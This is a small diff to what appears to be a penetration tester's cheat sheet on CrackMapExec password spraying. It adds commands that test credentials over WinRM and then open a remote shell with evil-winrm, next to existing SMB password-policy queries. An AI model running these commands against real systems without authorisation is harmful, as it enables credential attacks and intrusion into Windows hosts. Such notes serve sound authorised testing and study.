@@ -30,6 +30,11 @@ CRACKMAPEXEC PASSWORD SPRAYING
 ```
 crackmapexec smb <targetIP> --pass-pol
 crackmapexec smb <targetIP> --pass-pol -u '' -p ''
+
+
+crackmapexec winrm <target> -u <user> -p <password>
+If this returns Pwn3d, then you can leverage EvilWinRM to get the shell.
+evil-winrm -i <target> -u <username> -p <password>
 ```
 
 EXPORT LIST DOMAIN-USERS
